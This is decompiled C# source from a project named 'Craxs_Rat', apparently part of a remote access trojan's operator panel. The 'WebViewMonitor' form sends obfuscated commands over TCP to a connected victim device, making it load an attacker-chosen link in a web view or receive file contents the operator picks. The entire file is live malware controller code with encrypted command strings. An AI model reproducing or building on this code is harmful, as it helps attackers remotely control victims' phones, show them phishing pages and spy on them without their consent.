using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000CE RID: 206
	[DesignerGenerated]
	public partial class WebViewMonitor : Form
	{
		// Token: 0x06000F56 RID: 3926 RVA: 0x000A1B14 File Offset: 0x0009FD14
		public WebViewMonitor()
		{
			base.Load += this.WebViewMonitor_Load;
			base.FormClosing += this.WebViewMonitor_FormClosing;
			this.string_0 = "null";
			this.object_0 = true;
			this.int_0 = 0;
			this.InitializeComponent();
		}

		// Token: 0x1700048B RID: 1163
		// (get) Token: 0x06000F59 RID: 3929 RVA: 0x00006D94 File Offset: 0x00004F94
		// (set) Token: 0x06000F5A RID: 3930 RVA: 0x000A2EDC File Offset: 0x000A10DC
		internal virtual DrakeUITextBox TargetLink
		{
			[CompilerGenerated]
			get
			{
				return this._TargetLink;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.TargetLink_MouseDown);
				DrakeUITextBox targetLink = this._TargetLink;
				if (targetLink != null)
				{
					targetLink.MouseDown -= value2;
				}
				this._TargetLink = value;
				targetLink = this._TargetLink;
				if (targetLink != null)
				{
					targetLink.MouseDown += value2;
				}
			}
		}

		// Token: 0x1700048C RID: 1164
		// (get) Token: 0x06000F5B RID: 3931 RVA: 0x00006D9C File Offset: 0x00004F9C
		// (set) Token: 0x06000F5C RID: 3932 RVA: 0x000A2F20 File Offset: 0x000A1120
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon7
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon7;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon7_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon7;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon7 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon7;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700048D RID: 1165
		// (get) Token: 0x06000F5D RID: 3933 RVA: 0x00006DA4 File Offset: 0x00004FA4
		// (set) Token: 0x06000F5E RID: 3934 RVA: 0x000A2F64 File Offset: 0x000A1164
		internal virtual DrakeUIComboBox DrakeUIComboBox1 { get; set; }

		// Token: 0x1700048E RID: 1166
		// (get) Token: 0x06000F5F RID: 3935 RVA: 0x00006DAC File Offset: 0x00004FAC
		// (set) Token: 0x06000F60 RID: 3936 RVA: 0x000A2F78 File Offset: 0x000A1178
		internal virtual Label Mytitle { get; set; }

		// Token: 0x1700048F RID: 1167
		// (get) Token: 0x06000F61 RID: 3937 RVA: 0x00006DB4 File Offset: 0x00004FB4
		// (set) Token: 0x06000F62 RID: 3938 RVA: 0x000A2F8C File Offset: 0x000A118C
		public virtual Label statustext { get; set; }

		// Token: 0x17000490 RID: 1168
		// (get) Token: 0x06000F63 RID: 3939 RVA: 0x00006DBC File Offset: 0x00004FBC
		// (set) Token: 0x06000F64 RID: 3940 RVA: 0x000A2FA0 File Offset: 0x000A11A0
		internal virtual Panel Panel3 { get; set; }

		// Token: 0x17000491 RID: 1169
		// (get) Token: 0x06000F65 RID: 3941 RVA: 0x00006DC4 File Offset: 0x00004FC4
		// (set) Token: 0x06000F66 RID: 3942 RVA: 0x000A2FB4 File Offset: 0x000A11B4
		internal virtual DrakeUIScrollBar vsbar
		{
			[CompilerGenerated]
			get
			{
				return this._vsbar;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.vsbar_ValueChanged);
				DrakeUIScrollBar vsbar = this._vsbar;
				if (vsbar != null)
				{
					vsbar.ValueChanged -= value2;
				}
				this._vsbar = value;
				vsbar = this._vsbar;
				if (vsbar != null)
				{
					vsbar.ValueChanged += value2;
				}
			}
		}

		// Token: 0x17000492 RID: 1170
		// (get) Token: 0x06000F67 RID: 3943 RVA: 0x00006DCC File Offset: 0x00004FCC
		// (set) Token: 0x06000F68 RID: 3944 RVA: 0x000A2FF8 File Offset: 0x000A11F8
		internal virtual DrakeUITabControl DrakeUITabControl1 { get; set; }

		// Token: 0x17000493 RID: 1171
		// (get) Token: 0x06000F69 RID: 3945 RVA: 0x00006DD4 File Offset: 0x00004FD4
		// (set) Token: 0x06000F6A RID: 3946 RVA: 0x000A300C File Offset: 0x000A120C
		internal virtual TabPage TabPage1 { get; set; }

		// Token: 0x17000494 RID: 1172
		// (get) Token: 0x06000F6B RID: 3947 RVA: 0x00006DDC File Offset: 0x00004FDC
		// (set) Token: 0x06000F6C RID: 3948 RVA: 0x000A3020 File Offset: 0x000A1220
		internal virtual TabPage TabPage2 { get; set; }

		// Token: 0x17000495 RID: 1173
		// (get) Token: 0x06000F6D RID: 3949 RVA: 0x00006DE4 File Offset: 0x00004FE4
		// (set) Token: 0x06000F6E RID: 3950 RVA: 0x000A3034 File Offset: 0x000A1234
		internal virtual Label resulttext { get; set; }

		// Token: 0x17000496 RID: 1174
		// (get) Token: 0x06000F6F RID: 3951 RVA: 0x00006DEC File Offset: 0x00004FEC
		// (set) Token: 0x06000F70 RID: 3952 RVA: 0x000A3048 File Offset: 0x000A1248
		internal virtual Panel Panel4 { get; set; }

		// Token: 0x17000497 RID: 1175
		// (get) Token: 0x06000F71 RID: 3953 RVA: 0x00006DF4 File Offset: 0x00004FF4
		// (set) Token: 0x06000F72 RID: 3954 RVA: 0x000A305C File Offset: 0x000A125C
		internal virtual Label Label2 { get; set; }

		// Token: 0x17000498 RID: 1176
		// (get) Token: 0x06000F73 RID: 3955 RVA: 0x00006DFC File Offset: 0x00004FFC
		// (set) Token: 0x06000F74 RID: 3956 RVA: 0x000A3070 File Offset: 0x000A1270
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700049D RID: 1181
		// (get) Token: 0x06000F75 RID: 3957 RVA: 0x00006E04 File Offset: 0x00005004
		// (set) Token: 0x06000F76 RID: 3958 RVA: 0x000A30B4 File Offset: 0x000A12B4
		internal virtual BackgroundWorker BWloader
		{
			[CompilerGenerated]
			get
			{
				return this._BWloader;
			}
			[CompilerGenerated]
			set
			{
				DoWorkEventHandler value2 = new DoWorkEventHandler(this.BWloader_DoWork);
				BackgroundWorker bwloader = this._BWloader;
				if (bwloader != null)
				{
					bwloader.DoWork -= value2;
				}
				this._BWloader = value;
				bwloader = this._BWloader;
				if (bwloader != null)
				{
					bwloader.DoWork += value2;
				}
			}
		}

		// Token: 0x1700049E RID: 1182
		// (get) Token: 0x06000F77 RID: 3959 RVA: 0x00006E0C File Offset: 0x0000500C
		// (set) Token: 0x06000F78 RID: 3960 RVA: 0x000A30F8 File Offset: 0x000A12F8
		internal virtual Timer timeloader
		{
			[CompilerGenerated]
			get
			{
				return this._timeloader;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.timeloader_Tick);
				Timer timeloader = this._timeloader;
				if (timeloader != null)
				{
					timeloader.Tick -= value2;
				}
				this._timeloader = value;
				timeloader = this._timeloader;
				if (timeloader != null)
				{
					timeloader.Tick += value2;
				}
			}
		}

		// Token: 0x17000499 RID: 1177
		// (get) Token: 0x06000F79 RID: 3961 RVA: 0x00006E14 File Offset: 0x00005014
		// (set) Token: 0x06000F7A RID: 3962 RVA: 0x000A313C File Offset: 0x000A133C
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x1700049A RID: 1178
		// (get) Token: 0x06000F7B RID: 3963 RVA: 0x00006E1C File Offset: 0x0000501C
		// (set) Token: 0x06000F7C RID: 3964 RVA: 0x000A3150 File Offset: 0x000A1350
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x1700049B RID: 1179
		// (get) Token: 0x06000F7D RID: 3965 RVA: 0x00006E24 File Offset: 0x00005024
		// (set) Token: 0x06000F7E RID: 3966 RVA: 0x000A3164 File Offset: 0x000A1364
		internal virtual DrakeUICheckBox SaveCheck { get; set; }

		// Token: 0x1700049C RID: 1180
		// (get) Token: 0x06000F7F RID: 3967 RVA: 0x00006E2C File Offset: 0x0000502C
		// (set) Token: 0x06000F80 RID: 3968 RVA: 0x000A3178 File Offset: 0x000A1378
		internal virtual PictureBox vewimage { get; set; }

		// Token: 0x06000F81 RID: 3969 RVA: 0x000A318C File Offset: 0x000A138C
		private void TargetLink_MouseDown(object sender, MouseEventArgs e)
		{
			if (Conversions.ToBoolean(this.object_0))
			{
				this.object_0 = false;
				this.TargetLink.Text = "";
			}
		}

		// Token: 0x06000F82 RID: 3970 RVA: 0x000A31C4 File Offset: 0x000A13C4
		private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				if (!string.IsNullOrEmpty(this.TargetLink.Text) && !string.IsNullOrEmpty(this.TargetLink.Text))
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					int value = 0;
					int value2 = 0;
					string right = "";
					if (!Operators.ConditionalCompareObjectEqual(this.DrakeUIComboBox1.Text.ToLower(), NewLateBinding.LateGet(Module2.smethod_10("eZr3DfCMiS/Ewa9/vw2b7Q=="), null, "ToLower", new object[0], null, null, null), false))
					{
						right = Conversions.ToString(Module2.smethod_10("OvYnNTvG3Ctcsv9SuL3M+A=="));
						this.statustext.Text = Conversions.ToString(Module2.smethod_10("78BLRwA1JLzFvTN4YrVX8/3QhwJxjeszuW0vZeZMx5ndFga7UdTsRfNnMlmoCddD"));
					}
					else
					{
						this.statustext.Text = Conversions.ToString(Module2.smethod_10("PFpHOIO6qxZt49SVuesCIg=="));
					}
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0, Module2.smethod_11("bORlQeywIwrkkxg8BnzKHg==")), right), Module8.smethod_2(this.TargetLink.Text)), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(value)), GClass9.string_0), Conversions.ToString(value2)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				else
				{
					Alert.ShowWarning("Enter Link First !!!");
				}
			}
		}

		// Token: 0x06000F83 RID: 3971 RVA: 0x000A33C8 File Offset: 0x000A15C8
		private void WebViewMonitor_Load(object sender, EventArgs e)
		{
			this.DrakeUIComboBox1.Text = Conversions.ToString(Module2.smethod_10("eZr3DfCMiS/Ewa9/vw2b7Q=="));
		}

		// Token: 0x06000F84 RID: 3972 RVA: 0x000A33F0 File Offset: 0x000A15F0
		private void vsbar_ValueChanged(object sender, EventArgs e)
		{
			try
			{
				if (this.vewimage.Image != null)
				{
					this.int_0 = (sender as DrakeUIScrollBar).Value;
					this.vewimage.Refresh();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000F85 RID: 3973 RVA: 0x000A344C File Offset: 0x000A164C
		private void method_3(object sender, PaintEventArgs e)
		{
			try
			{
				object obj = sender as PictureBox;
				object graphics = e.Graphics;
				Type type = null;
				string memberName = "DrawImage";
				object[] array = new object[7];
				int num = 0;
				object instance = obj;
				array[num] = NewLateBinding.LateGet(instance, null, "Image", new object[0], null, null, null);
				array[1] = e.ClipRectangle;
				array[2] = 0;
				int num2 = 3;
				ref int ptr = ref this.int_0;
				array[num2] = this.int_0;
				int num3 = 4;
				Rectangle clipRectangle;
				Rectangle rectangle = clipRectangle = e.ClipRectangle;
				array[num3] = clipRectangle.Width;
				int num4 = 5;
				Rectangle rectangle2 = clipRectangle = e.ClipRectangle;
				array[num4] = clipRectangle.Height;
				array[6] = GraphicsUnit.Pixel;
				object[] array2 = array;
				bool[] array3;
				NewLateBinding.LateCall(graphics, type, memberName, array, null, null, array3 = new bool[]
				{
					true,
					false,
					false,
					true,
					true,
					true,
					false
				}, true);
				if (array3[0])
				{
					NewLateBinding.LateSetComplex(instance, null, "Image", new object[]
					{
						array2[0]
					}, null, null, true, false);
				}
				if (array3[3])
				{
					ptr = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(int));
				}
				if (array3[4])
				{
					rectangle.Width = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[4]), typeof(int));
				}
				if (array3[5])
				{
					rectangle2.Height = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[5]), typeof(int));
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000F86 RID: 3974 RVA: 0x0000246D File Offset: 0x0000066D
		private void BWloader_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000F87 RID: 3975 RVA: 0x000A35DC File Offset: 0x000A17DC
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.InitialDirectory = "C:\\";
				openFileDialog.Title = Conversions.ToString(Module2.smethod_11("JsuS3oQ+XD9Qs8iJEkIGRT6Cn+buGV8C1aVai8KTM5o="));
				openFileDialog.Filter = Conversions.ToString(Module2.smethod_11("c576BYy3TOBRjgESbAPcCcPMiByfhQ+VIMLJ+1/IgUM="));
				DialogResult dialogResult = openFileDialog.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					object fileName = openFileDialog.FileName;
					DialogResult dialogResult2 = MessageBox.Show(Conversions.ToString(Module2.smethod_11("HkgQj2r7AVYi/UJb7HHv/3aIOMc3LoRrWD8hwPNXl3k=")), "Confirm", MessageBoxButtons.YesNo);
					if (dialogResult2 == DialogResult.Yes)
					{
						TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
						string[] array = this.gclass8_0.string_0.Split(new char[]
						{
							':'
						});
						object objectValue = RuntimeHelpers.GetObjectValue(Module2.smethod_28(File.ReadAllText(Conversions.ToString(fileName))));
						object[] objects_ = new object[]
						{
							tcpClient_,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0, Module2.smethod_11("tePOxnJHeLeqNp8OWx80bA==")), objectValue), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000F88 RID: 3976 RVA: 0x0000246D File Offset: 0x0000066D
		private void WebViewMonitor_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x06000F89 RID: 3977 RVA: 0x0000246D File Offset: 0x0000066D
		private void timeloader_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x04000881 RID: 2177
		public GClass8 gclass8_0;

		// Token: 0x04000882 RID: 2178
		public string string_0;

		// Token: 0x04000883 RID: 2179
		public object object_0;

		// Token: 0x04000884 RID: 2180
		private int int_0;
	}
}
